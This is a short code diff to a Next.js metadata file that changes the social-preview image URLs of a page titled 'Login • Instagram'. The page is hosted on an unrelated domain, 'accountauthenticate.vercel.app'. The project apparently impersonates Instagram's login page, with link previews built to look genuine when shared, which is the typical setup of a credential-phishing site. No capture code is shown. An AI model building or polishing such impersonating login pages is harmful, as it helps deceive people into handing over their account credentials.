@@ -18,7 +18,7 @@ export const metadata: Metadata = {
     images: [
       {
         // Use a SQUARE logo (1:1 aspect ratio) for better previews
-        url: 'https://accountauthenticate.vercel.app/preview.png', // Replace with your hosted square image
+        url: 'https://i.ibb.co/678DVn1M/preview.png', // Replace with your hosted square image
         width: 1200,
         height: 630,
         alt: 'Instagram Login Preview',
@@ -31,7 +31,7 @@ export const metadata: Metadata = {
     card: 'summary_large_image',
     title: 'Login • Instagram',
     description: 'Log in to Instagram to connect with friends and share your moments',
-    images: ['https://accountauthenticate.vercel.app/preview.png'], // Same square image
+    images: ['https://i.ibb.co/678DVn1M/preview.png'], // Same square image
   },
 };
 
